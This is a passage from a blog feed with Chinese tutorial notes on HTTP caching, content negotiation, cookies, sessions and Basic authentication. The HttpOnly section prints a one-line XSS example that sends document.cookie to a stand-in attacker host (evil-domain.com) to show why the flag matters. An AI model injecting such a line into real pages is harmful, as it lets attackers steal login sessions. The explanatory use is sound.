消除了大量歧义内容并引入了多项改进：</p><ul><li>连接可以复用，节省了多次打开 TCP 连接加载网页文档资源的时间。</li><li>增加流水线技术，允许在第一个应答被完全发送之前就发送第二个请求，以降低通信延迟。</li><li>支持响应分块。</li><li>引入额外的缓存控制机制。</li><li>引入内容协商机制，包括语言、编码、类型等。并允许客户端和服务器之间约定以最合适的内容进行交换。</li><li>凭借 <code>Host</code>标头，能够使不同域名配置在同一个 IP地址的服务器上。</li></ul><p>连接复用和流水线技术已经在<a href="https://lunaticsky-tql.github.io/posts/31511/">认识HTTP(二)</a>中有所讲述，这里再继续讲解一些其他的一些机制。</p><h3 id="缓存策略">缓存策略</h3><p>关于控制缓存策略的参数，最好的参考资料还是<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control">第一手资料</a>。这里对常见的控制策略进行讲解，以便更快的理解常见的情形。</p><ol type="1"><li>首先，浏览器端会根据<code>cache-control</code>是否是<code>no-store</code>来判断是否可以对返回的数据进行缓存，如果是<code>no-store</code>表示不允许缓存，之后的请求都不会走缓存，而是重新想向务器端发送请求。</li><li>如果不是<code>no-store</code>，一般情况下就是只返回<code>max-age: xxx</code>来告诉浏览器端可以对数据进行缓存，并且设置缓存的失效时间，通过<code>max-age</code>有时候会搭配<code>no-cache</code>或者<code>must-revalidate</code>一起返回，<code>no-cache</code>和<code>must-revalidate</code>就是控制要去服务器端进行验证数据是否真的有变化。关于两者的区别后面会讲述。</li><li>那如何验证变化呢？就是借助<code>Last-Modified/if-Modified-Since</code>，或者<code>ETag/If-None-Match</code>来判断，如果确实有变化，则返回最新数据，如果没有变化，则返回<code>304</code>，同时更新缓存的失效时间。</li></ol><p>下面对上述提到的概念进行详细的表述，可以对照查看。</p><h4 id="缓存控制">缓存控制</h4><p>缓存控制是通过<code>cache-control</code>这个字段进行的。</p><h6 id="服务器">服务器</h6><ul><li><code>max-age</code>：表示缓存在几s后会失效，是一个相对时间，但是要注意的是，该时间是从响应报文创建的时间就开始计时</li><li><code>no-store</code>:表示不允许缓存，通常一些频繁变化的页面，需要设置该选项。这样</li><li><code>no-cache</code>:该字段表示<strong>允许缓存</strong>，但是<strong>使用缓存之前必须要先去服务器端验证是否过期</strong>，如果没过期，则使用缓存，如果过期了，则返回最新数据。</li><li><code>must-revalidate</code>:表示<strong>允许缓存，并且如果缓存不过期的话，先使用缓存，如果缓存过期的话，再去服务器端进行验证，</strong>（如果验证有变化，则返回最新资源，如果验证没变化，则返回<code>304 Not Modified</code>，然后更新<code>max-age</code>的失效时间。同时注意，并不是缓存过期了浏览器就一定需要删除缓存）</li></ul><h6 id="客户端">客户端</h6><p>服务器端如何在响应头中添加响应的字段来浏览来是否可以使用缓存，同样，客户端自己也可以控制，即浏览器也可以在请求中中添加<code>cache-control</code>等字段。</p><ol type="1"><li>浏览器刷新</li></ol><p>即我们按F5刷新页面的时候，该页面的http请求中会添加：<code>cache-control:max-age:0</code>。注意这时候如果服务器的缓存控制策略没有<code>must-revalidate</code>的话，浏览器还可能继续使用这个缓存，异步地发送一个条件性GET请求（带有<code>If-Modified-Since</code>或<code>If-None-Match</code>头部），以验证资源是否仍然有效。然后如果服务器返回304响应，表示资源仍然有效，浏览器会再更新一次过期时间。但是由于这个过程是“先斩后奏”的，用户大部分时候感觉不到这个过程，打开F12也会发现“已缓存”的字样。</p><ol start="2" type="1"><li>浏览器强制刷新</li></ol><p>即我们按ctrl+f5强制刷新页面的时候，该页面的http请求会添加：<code>cache-control:no-cache</code>;即表示此时要首先去服务器端验证资源是否有更新，如果有更新则直接返回最新资源，如果没有更新，则返回304，然后浏览器端判断是304的话，则从缓存中读取数据。</p><ol start="3" type="1"><li>浏览器前进后退重定向</li></ol><p>当我们点击浏览器的前进后退操作时，这个时候请求中不会有<code>cache-control</code>的字段，没有该字段，就表示会检查缓存，直接利用之前的资源，不再重新请求服务器。</p><p>另外，<code>expires</code>是HTTP1.0时的头选项。浏览器会优先使用<code>cache-control</code>来判断缓存是否过期。如果只返回了<code>expires</code>，则浏览器会将<code>expires</code>转换为<code>cache-control</code>来判断缓存是否过期。如果同时返回了<code>cache-control</code>和<code>expires</code>两个响应头，浏览器会优先使用<code>cache-control</code>来判断缓存是否过期</p><h4 id="缓存验证">缓存验证</h4><p>浏览器判断顶多是根据服务器端返回的失效时间去判断，这样并不一定准确，因为很可能出现缓存失效的情况，但其实资源并没有发生变化，这个时候其实也是应该走缓存的，那如何判断资源有没有发生变化呢？这必须交给服务器端来判断了。下面介绍通过<code>Last-Modified/If-Modified-Since</code>，和<code>ETag/If-None-Match</code>两种策略判断。后者是优先于前者的。</p><ol type="1"><li><code>Last-Modified/If-Modified-Since</code></li></ol><p>即该字段是服务器端返回给客户端的响应头字段，表示当前请求的资源的最后修改时间，如果响应头中有该字段，那么下次请求的时候，请求头中就会包含<code>If-Modified-Since</code>字段，它的值就是<code>Last-Modified</code>的值，这样服务器端收到该字段的值，就可以和对应的资源最终的修改时间做对比，如果发生变化，则说明资源发生了变化，则返回最新资源（此时状态码是200），如果没有发生变化，则返回304，浏览器从缓存中直接去数据即可。</p><ol start="2" type="1"><li><code>ETag/If-None-Match</code></li></ol><p>使用资源的最后更改时间作为判断资源是否更改可能会有问题？比如：资源改了之后，又改了回来，这时虽然资源的最后修改时间发生了变化，但其实资源内容本身没有发生变化，其实这种情况也应该是走缓存的，所以才出现了<code>ETag</code>字段，表示资源的唯一标识，那如果响应头中有该字段，则下次请求的时候，请求头中就会有<code>If-None-Match</code>字段，它的值就是<code>ETag</code>的值，服务器端收到以后，就会和当前资源的唯一表识别去对比，如果不一样，则说明资源发生变化，返回最新数据即可（此时状态码是200），如果一样，则说明资源没有变化，返回304，浏览器从缓存中读取数据。</p><h3 id="内容协商">内容协商</h3><h4 id="概述">概述</h4><p>我们在抓包或者写爬虫时经常注意到有很多以<code>Accept</code>开头的请求首部，还有<code>q=xxx</code>之类的东西，这些个东西都是什么意思？</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222830544104_566_image-20230828110618870.png" alt="image-20230828110618870"><figcaption aria-hidden="true">image-20230828110618870</figcaption></figure><p>以<code>Accept-Language</code>为例，我们容易猜测到是用户浏览器向服务器请求的语言选项。一个URL常常需要代表若干不同的资源。例如那种需要以多种语言提供其内容的网站站点。如果某个站点有说中文的和说英语的两种用户，它可能想用这两种语言提供网站站点信息。理想情况下，服务器应当向英语用户发送英文版，向中文用户发送中文版——用户只要访问网站主页就可以得到相应语言的内容。</p><p>HTTP提供了内容协商方法，允许客户端和服务器作这样的决定。通过这些方法，单一的URL就可以代表不同的资源（比如，同一个网站页面的中文版和英语版），这些不同的版本称为变体。</p><h4 id="方式">方式</h4><p>一共有3种不同的方法可以决定服务器上哪个页面最适合客户端：客户端来选择、服务器自动判定、让中间代理来选。这三种技术分别称为客户端驱动的协商、服务器驱动的协商以及透明协商。</p><h5 id="客户端驱动">客户端驱动</h5><p>客户端发起请求，服务器发送返回一个页面，该页面包含指向该资源所有可用表示的链接，客户端作出选择后再发送第二次请求。</p><ul><li>优点：比较自然，服务器提供内容，由客户进行选择，减少Header冗余</li><li>缺点：增加了时延，至少要发送两次请求，第一次请求获取资源列表，第二次获取选择的副本；同时HTTP标准也没有明确指定提供可选资源链接的页面的格式，无法进行无感知的自动化选择。</li></ul><h5 id="服务器驱动">服务器驱动</h5><p>服务器检查客户端的请求首部集并决定提供哪个版本的页面。</p><ul><li>优点：比客户端驱动的协商要快。HTTP提供了q机制，允许服务器近似匹配。</li><li>缺点：首部集不匹配，服务器要做猜测；</li></ul><p>目前浏览器是采用服务器驱动的协商策略。当然服务器仍然可以在页面上提供语言选项供用户手动选择，就像大多数多语言的网页一样。</p><h4 id="内容协商首部">内容协商首部</h4><h5 id="客户端-1">客户端</h5><p>客户端可以用下面列出的<strong>内容协商首部</strong>集发送用户的偏好信息：</p><blockquote><p>Accept：告知服务器发送何种媒体类型；Accept-Language：告知服务器发送何种语言；Accept-Charset：告知服务器发送何种字符集；Accept-Encoding：告知服务器采用何种编码；</p></blockquote><h5 id="服务器-1">服务器</h5><p>服务器用下面列出的<strong>实体首部</strong>集来匹配客户端的Accept首部集：</p><blockquote><p>Accept首部 　　 实体首部 Accept 　　　　　 Content-TypeAccept-Language Content-Language Accept-Charset Content-TypeAccept-Encoding Content-Encoding</p></blockquote><p>同时，实体首部也不是必须的。比如，如果没有<code>Content-Language</code> ，则默认为内容适用于所有语言受众。</p><h5 id="q值">q值</h5><p>这里的q是指<strong>Quality values</strong>。</p><p>q值的范围从0.0~1.0（1.0优先级最高)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h4c136llvxiv1w"></i><span>http</span><div class="collapse show" id="collapse-h4c136llvxiv1w"><pre><code class="hljs http"><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</code></pre></div></div><p>这个首部表示：用户最愿意接受中文（zh），繁体的也行，英文次之。其他语言不接受(或以q=0.0表示)。如果是表示不特指的话是会以星号<code>*</code>表示。</p><h5 id="vary">vary</h5><p>前面提到，客户端驱动是很自然的思路，也就是服务端提供，客户选择。实际广泛采用的情况是服务端驱动，也就是客户端提供多种接受的选项，服务器提供一个最符合的。</p><p>但是，服务端有时候只能提供一种内容，比如我就只有中文版的网页供用户查看。有而且，实际上大多数时候会存在中间缓存服务器来缓解内容提供服务器的压力。<code>vary</code>就主要用在这种情形下。</p><p>HTTP的<code>vary</code>响应首部中列出了所有客户端请求首部，缓存服务器可以用这些首部来选择文档或者产生定制的内容。比如：若给客户端的响应内容取决于<code>Accept-Encoding</code>，<code>vary</code>首部就必须包含<code>Accept-Encoding</code>。回到上面说的情况，既然只有中文版的网页，<code>vary</code>首部就不包含<code>Accept-Language</code>，这样缓存服务器就不用根据用户的<code>Accept-Language</code>来进行内容选择了，可以省很多工作。</p><p>相应的，为了实现透明协商，<strong>缓存服务器必须为每个已缓存变体保存客户端请求首部和相应的服务器响应首部</strong>。也就是指明<code>vary</code>的内容，就必须要缓存。</p><h5 id="实例">实例</h5><p>以访问我自己的博客为例：</p><p>请求头(客户端)：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222833287138_195_image-20230828121728247.png" alt="image-20230828121728247"><figcaption aria-hidden="true">image-20230828121728247</figcaption></figure><p>响应头(服务器)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86HTTP%E4%B8%80/20230828222835355015_405_image-20230828121901409.png" alt="image-20230828121901409"><figcaption aria-hidden="true">image-20230828121901409</figcaption></figure><p><code>vary</code>字段为<code>Accept-Encoding</code>。</p><h4 id="更多">更多</h4><p>内容协商策略为改善互联网用户的体验，提高传输效率提供了很大的帮助。但是内容协商使HTTP头增大了不少，而且在每一次请求中都必须发送这些首部。在首部很少的时候，这并不是问题，但是随着数量的增多，消息体的体积会导致性能的下降。带有精确信息的首部发送的越多，信息熵就会越大，也就准许了更多HTTP指纹识别行为，以及与此相关的隐私问题的发生。另外，如果希望更详细的了解内容协商算法，可以参见<a href="https://httpd.apache.org/docs/2.2/en/content-negotiation.html#algorithm">Apache服务器的内容协商算法</a>。</p><h2 id="总结">总结</h2><p>这一部分主要介绍了HTTP发展历史的前面部分，重点对HTTP1.1的缓存控制策略和内容协商进行了讲解。后面会结合实践深入探索HTTP2的内容，并对https的原理进行介绍。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP总结(二)</title>
    <link href="/posts/31511/"/>
    <url>/posts/31511/</url>
    
    <content type="html"><![CDATA[<h1 id="http总结二">HTTP总结(二)</h1><p>可以说，我们浏览网页，下载资源，甚至克隆一个感兴趣的github仓库，都在与HTTP协议打交道。但是，在计算机网络课程和考研中HTTP都不作为重点去讲述，而在面试和实际工作中却经常需要接触。因此更深入的了解HTTP协议显得尤为重要。<a href="https://lunaticsky-tql.github.io/posts/64429/">上一部分</a>主要讲述了包括HTTP协议中报文发送和接受本身的内容，如请求方法，状态码，以及常见首部字段的含义。这一部分继续从连接的角度看HTTP协议。</p><h2 id="连接管理">连接管理</h2><p><strong>HTTP/1.0缺省为非持久连接</strong></p><ul><li>服务器接收请求、给出响应、关闭TCP连接</li></ul><p>获取每个对象需要两阶段</p><ul><li>建立TCP连接</li><li>对象请求和传输</li></ul><p>每次连接需要经历TCP慢启动阶段</p><p><strong>HTTP/1.1缺省为持久连接</strong></p><p>在 HTTP/1.1 [<a href="https://link.zhihu.com/?target=https%3A//tools.ietf.org/html/rfc7540">RFC2616]</a> 中, Connection: keep-alive 被 IETF 正式标准化, 并默认开启keep-alive, 当不需要 TCP 连接维持时需要显式的在 Header 中设置Connection: close</p><p><strong>HTTP/1.1支持流水线机制</strong></p><p>在 HTTP/1.0 中, HTTP 请求都是完全阻塞的, 即客户端只有在上一次 HTTP请求完成以后才可以继续发送下一次 HTTP 请求, HTTP/1.1 对此作了改进, 允许pipelining 方式的调用, 即客户端可以在没有收到 Response的情况下连续发送多次 HTTP Request。</p><p>但是，服务端依旧是顺序对请求进行处理, 并按照收到请求的次序予以返回,也就说在 HTTP/1.1 中 HTTP请求的处理仍然是线性的。这就是所谓的队头阻塞问题。</p><p>举个例子，在流水线机制下即便 Client 连续发送了多个 HTTP Request,若其中<code>image1.jpg</code>因为某些原因服务器响应非常耗时, 则在其后的Request都处于排队阻塞的状态，这样以来即便客户给了服务器一堆请求，服务器还是单线程的，挨个相应每一个图片，流水线的意义也就不大了。</p><p>后面会讲到HTTP2通过流的方式解决了这个问题。</p><p>下面以客户端获取一个含有两个图片的网页为例说明比较HTTP1.0和HTTP1.1：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205258987659_478_20230825233745413813_440_image-20230825212013023.png" alt="image-20230825212013023"><figcaption aria-hidden="true">image-20230825212013023</figcaption></figure><h2 id="连接状态保存">连接状态保存</h2><p>HTTP是无状态的协议，协议对于发送过的请求和接受过的请求都不做持久化处理，这样可以更快地处理大量事物，确保协议的可伸缩性。不过我们实际上还是需要知道一些连接的信息，比如请求是哪个用户发过来的。可以通过session和cookie两种方式实现，当然也会结合进行使用。</p><h3 id="cookie">cookie</h3><h4 id="简介">简介</h4><p>cookie或许是我们上网中很熟悉的东西了。很多网站都会弹框要求我们选择是否接受所有cookie。</p><p><strong>cookie储存在客户端</strong>。Server 可以在 HTTP response中返回 <code>Set-Cookie</code> header 来告诉浏览器要设定 cookie。设定的语法如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u4wbemlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-u4wbemlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>[cookie名称]=[cookie值]</code></pre></div></div><p>浏览器看到 <code>Set-Cookie</code> header 便会将 cookie储存起来，之后对同一个 domain 发送 HTTP request 的时候，浏览器就会将cookie 带在 HTTP request 的 <code>Cookie</code> header 里。</p><p>Request 中的 cookie header 会是 <code>[cookie名称]=[cookie值]</code>的形式，用分号串接之后的结果：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4hykjjlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-4hykjjlluxp18z"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>[cookie1]=[value1]; [cookie2]=[value2]</code></pre></div></div><p>当然，Web 服务器需要建立后端数据库，记录用户信息。</p><h4 id="相关参数">相关参数</h4><p>在笔试题目中，也考察过cookie相关参数的含义。这里对此也进行细致的讲解。</p><p>Cookie 除了名称和值之外，通常还需要设定其他额外参数，下面会一一介绍。新增参数的方式是用分号区隔各个参数，例如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9j3wn0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-9j3wn0lluxp18z"><pre><code class="hljs plaintext">user=John; path=/; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div><p>简单地说，我们会用 <code>Domain</code> 和 <code>Path</code> 指定cookie 的可用范围，用 <code>Expires</code> 和 <code>Max-Age</code> 控制cookie 的有效期限，而 <code>HttpOnly</code>、 <code>Secure</code>、和<code>SameSite</code> 则是和安全性相关的参数。</p><h5 id="domain">Domain</h5><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wjeeexlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-wjeeexlluxp18z"><pre><code class="hljs plaintext">domain=example.com</code></pre></div></div><p><code>domain</code> 用来指定哪些网域可以存取这个 cookie。<strong>默认值是当前网域，但是不包含其子域。</strong></p><p>例如在 <a href="http://example.com">example.com</a> 底下设置的 cookie不指定 <code>domain</code> 的情况下，只有 <a href="http://example.com">example.com</a> 可以访问此 cookie，但子域如 <a href="http://subdomain.example.com">subdomain.example.com</a>则无法访问此 cookie。</p><p>如果我们想要让子域访问 cookie，就必须明确地设置 <code>domain</code>参数。 例如：当一个 cookie 指定 <code>domain=example.com</code> 时，包含<a href="http://example.com">example.com</a> 以及他的子网域 <a href="http://subdomain.example.com">subdomain.example.com</a>都能够访问这个 cookie。</p><h5 id="path">Path</h5><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-djgvi0lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-djgvi0lluxp18z"><pre><code class="hljs plaintext">path=/admin</code></pre></div></div><p><code>path</code> 参数用来指定哪些路径可以访问这个cookie。</p><p>例如：假设 domain 是 <a href="http://example.com">example.com</a>，且<code>path=/admin</code>，则 <a href="http://example.com/admin">example.com/admin</a> 或是子路径 <a href="http://example.com/admin/settings">example.com/admin/settings</a>都可以存取此 cookie，但 <a href="http://example.com">example.com</a>或是 <a href="http://example.com/home">example.com/home</a> 则无法访问此cookie。</p><p><strong><code>Path</code> 的默认值是当前的路径。</strong></p><p>一般而言来说，认证用途的 cookie 会设成<code>path=/</code>，让全站都可以存取此cookie，如此一来不管在网站的哪个路径下，server 都能认得用户的身份。</p><h5 id="expires-max-age">Expires, Max-age</h5><p><code>expires</code>， <code>max-age</code>参数的作用是设定cookie的有效期限。</p><p><strong>如果没有额外设置 <code>expires</code> 或是<code>max-age</code> 参数，当浏览器关闭之后，储存在浏览器的 cookie便会消失，这就是所谓的 session cookie</strong> 。</p><p>如果我们希望浏览器关掉之后 cookie 还是会被保存下来，那就必须设置<code>expires</code> 或是 <code>max-age</code>。</p><p><code>expires</code> 是 UTC 格式表示的有效期限，在 JavaScript 中可用<code>date.toUTCString()</code> 取得：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xbaobvlluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-xbaobvlluxp18z"><pre><code class="hljs plaintext">cookie=value; expires=Tue, 19 Jan 2038 03:14:07 GMT</code></pre></div></div><p><code>max-age</code> 表示从设定开始算之后几秒之内 cookie是有效的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-uwdg20lluxp18z"></i><span>plaintext</span><div class="collapse show" id="collapse-uwdg20lluxp18z"><pre><code class="hljs plaintext">cookie=value; max-age=3600</code></pre></div></div><h5 id="secure">Secure</h5><p><code>Secure</code> 参数的作用是让 cookie 只能通过 https 传递。<strong>Cookie 默认是不区分 http 或是 https 的。</strong></p><p>换句话说，当我们设定 <a href="http://example.com">http://example.com</a> 的 cookie 时， <a href="https://example.com">https://example.com</a> 也能看得到同样的cookie。</p><p>如果 cookie 设了 <code>secure</code> 参数，只有通过 https访问这个网站才能访问这个 cookie; 透过 http 存取这个网站会看不到这个cookie。</p><p>这个参数的作用在于保护 cookie 只能在 https 传递。话虽如此，我们还是不能将敏感信息储存在 cookie 中。</p><h5 id="httponly">Httponly</h5><p><code>HttpOnly</code> 参数的作用是防止 JavaScript 访问 cookie。</p><p>当一个 cookie 设置了 <code>httpOnly</code> 的属性之后，JavaScript就不能存取这个 cookie，但是浏览器在发送 request 的时候还是会帮你带在request header 里面。</p><p>这个参数的设计是为了安全性考量，因为如果 JavaScript 能够访问这个cookie 就有受到 XSS Attack （Cross-Site Scripting，跨站脚本攻击）的风险。</p><p>什么是 XSS Attack （跨站脚本攻击） 呢？ 简单的说，就是将一段恶意的JavaScript 代码通过表单等方式上传到server，之后这份表单数据在前端呈现的时候恶意的 JavaScript 代码会被当成是HTML 的一部分被执行。 假设黑客能够执行 JavaScript，便能很轻易地访问<code>document.cookie</code>，就能够窃取你用来登入的cookie，并且用你的身份做恶意的操作：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ih39q0lluxp18z"></i><span>javascript</span><div class="collapse show" id="collapse-ih39q0lluxp18z"><pre><code class="hljs javascript"><span class="hljs-comment">// 把你的 cookie 送到黑客的服务器</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>()).<span class="hljs-property">src</span> = <span class="hljs-string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;</code></pre></div></div><p>这就是为什么我们需要禁止 JavaScript 访问 cookie。</p><h4 id="samesite">Samesite</h4><p><code>Samesite</code> 的作用是防止 cookie以跨站方式传送，可以帮助避免 CSRF （Cross-Site RequestForgery，跨站请求伪造） 攻击。 由于篇幅有限，如果希望进一步了解CSRF，<a href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">这里</a>是一篇很好的介绍CSRF的文章。同时SameSite也可以对第三方Cookie的使用进行一些限制，如下面所述。</p><h4 id="第三方cookie">第三方cookie</h4><p>网页很多时候会需要向其他域请求资源，例如：我们可能会用<code>&lt;img src="..."&gt;</code> 的方式嵌入一张其他域的图片。这些request也可以携带cookie，携带哪些cookie主要会根据资源的域。</p><p>举个例子说明：假设我现在浏览 <a href="http://example.com">example.com</a>，其中包含一张图片<code>&lt;img src="https://example.com/image.png"&gt;</code>，此时携带的cookie 就会是 <a href="http://example.com">example.com</a> 底下的cookie。 因为这个请求的域和网址栏的域同样都是 <a href="http://example.com">example.com</a>，所以这是一个相同域的请求。此时 <a href="http://example.com">example.com</a> 底下的 cookie又称作第一方 cookie （first-party cookie）。</p><p>如果 <a href="http://example.com">example.com</a> 包含另外一张图片<code>&lt;img src="https://ad.com/image.png"&gt;</code>，他的网址是 <a href="http://ad.com">ad.com</a>，此时携带的 cookie 就会是 <a href="http://ad.com">ad.com</a> 底下的 cookie。因为<a href="http://ad.com">ad.com</a> 不同于网址列的 <a href="http://example.com">example.com</a>，所以这是一个跨域请求。此时 <a href="http://ad.com">ad.com</a> 底下的 cookie 又稱作<strong>第三方cookie (third-party cookie)</strong>。</p><p>第三方 cookie 为什么重要呢？ 因为他能够跨域的追踪。 举例来说， <a href="http://example.com">example.com</a> 发出 <a href="http://ad.com">ad.com</a> 的请求时，会携带 <a href="http://ad.com">ad.com</a> 的 cookie。 如果同时有另一个域 <a href="http://anothersite.com">anothersite.com</a> 也会请求 <a href="http://ad.com">ad.com</a> 的资源，也会携带同样的 cookie。 如果这个cookie 是用来表示用户 id，则对 <a href="http://ad.com">ad.com</a>而言不管在哪个网域底下，他都知道两个网站的造访者都是你。这就是广告追踪的原理。</p><p>现在主流的浏览器都是默认禁止第三方cookie的。如果希望了解更多可以参阅<a href="https://zhuanlan.zhihu.com/p/131256002">这篇文章</a></p><h3 id="session">Session</h3><p>客户端第一次发送信息到服务器时，服务器为该客户端创建一个 session对象，该 session 包含客户端身份信息，同时为该 session 生成一个 sessionID。 服务端将这个 sessionID 分配给客户端，客户端发送请求时带有此 sessionID，服务端就可以区分客户端。</p><p>Session存储在服务器的内存中，根据业务需要，Session可以在内存中，也可以持久化到file，数据库，memcache，redis等。客户端只保存sessionid到cookie中，而不会保存session，session销毁只能通过invalidate或超时，关掉浏览器并不会关闭session。</p><h2 id="http认证">HTTP认证</h2><h4 id="基本认证">基本认证</h4><p>首先说明，这种认证方法虽然被HTTP协议本身所提供，但在实际中很少用到，具体原因会在后面解释，了解即可。</p><p>Basic认证中，最关键的三个要素：</p><ol type="1"><li>userid：用户的id。也就是我们常说的用户名。</li><li>password：用户密码。</li><li>realm：“领域”，其实就是指当前认证的保护范围。</li></ol><p>同一个server，访问受限的资源多种多样，比如资金信息、机密文档等。可以针对不同的资源定义不同的realm，并且只允许特定的用户访问。</p><p>在这种认证方法下，用户每次发送请求时，请求头中都必须携带能通过认证的身份信息。下面举例说明。</p><p>1.<strong>客户端(例如Web浏览器)</strong>：向服务器请求图片</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-la2t5rlluxp18z"></i><span>http</span><div class="collapse show" id="collapse-la2t5rlluxp18z"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cover/girl1.jpg</span>  <span class="hljs-string">HTTP/1.1</span></code></pre></div></div><p>2.<strong>服务器</strong>：这个资源在安全区data里，是受限资源，需要基本认证，请带上你的用户名和密码再来请求</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-44jwy9lluxp18z"></i><span>http</span><div class="collapse show" id="collapse-44jwy9lluxp18z"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">401</span> Authorization Required<span class="hljs-attribute">www-Authenticate</span><span class="hljs-punctuation">: </span>Basic realm= "data"</code></pre></div></div><p>服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在<code>www-Authenticate</code>这个Header里面有两个值，<code>Basic</code>：说明需要基本认证，<code>realm</code>：说明客户端需要输入这个安全区的用户名和密码。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。</p><p>3.<strong>客户端</strong>：携带相应的用户名密码信息，发送给服务器。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-773joclluxp18z"></i><span>http</span><div class="collapse show" id="collapse-773joclluxp18z"><pre><code class="hljs http">GET /cover/girl1.jpg  HTTP/1.1 <span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>BasicbHVuYXRpY3NreTp0cWxhMzE0</code></pre></div></div><p>Basic 内容为： <strong>用户名:密码</strong>的base64形式，如<code>lunaticsky:tqla314</code></p><p>这种认证方式看上去很简单直接，为什么说很少被真正使用呢？主要还是<strong>不安全</strong></p><ul><li><p>单纯使用HTTP的话，认证身份信息用明文传送的，所以这个基本认证的用户名和密码也是可以被人看到的，虽然它使用了Base64来编码，但这个编码很容易就可以解码出来，所以就是使用也是结合HTTPS来使用。</p></li><li><p>即使密码被强加密，第三方仍可通过加密后的用户名和密码进行重放攻击。</p></li><li><p>没有提供任何针对代理和中间节点的防护措施。也就是不能防止中间人攻击。中间人可以修改报文然后请求服务器。</p></li></ul><p>另外还有很多其他原因，比如这种基本认证浏览器会弹出一个弹窗要求用户输入用户名和密码，不能进行定制，用户体验不好。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A4%E8%AF%86HTTP%E4%BA%8C/20230828205300371135_814_20230826160646173640_409_image-20230825225412200.png" alt="image-20230825225412200"><figcaption aria-hidden="true">image-20230825225412200</figcaption></figure><h4 id="session认证">Session认证</h4><p>这种认证方法结合了 Session 和 Cookie。服务端将本次会话信息以 Session对象的形式保存在服务端的内存、数据库或文件系统中，并将对应的 Session对象 ID 值 SessionID 以 Cookie 形式返回给客户端，SessionID保存在客户端的 Cookie 中。</p><p>这是一种有状态的认证方法：服务端保存 Session 对象，客户端以 Cookie形式保存 SessionID。</p><blockquote><p>1、用户向服务器发送用户名和密码。</p><p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p><p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p><p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id传回服务器。</p><p>5、服务器收到session_id，找到前期保存的数据，由此得知用户的身份。</p></blockquote><h2 id="总结">总结</h2><p>这一部分从HTTP连接的角度介绍了连接管理，连接状态保存和用户认证相关的内容。特别是根据最近笔试题目对cookie相关的知识点进行了较为详细的补充。后续会进一步从HTTP发展历程的角度重新深入的认识HTTP。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP总结(一)</title>
    <link href="/posts/64429/"/>
    <url>/posts/64429/</url>
    
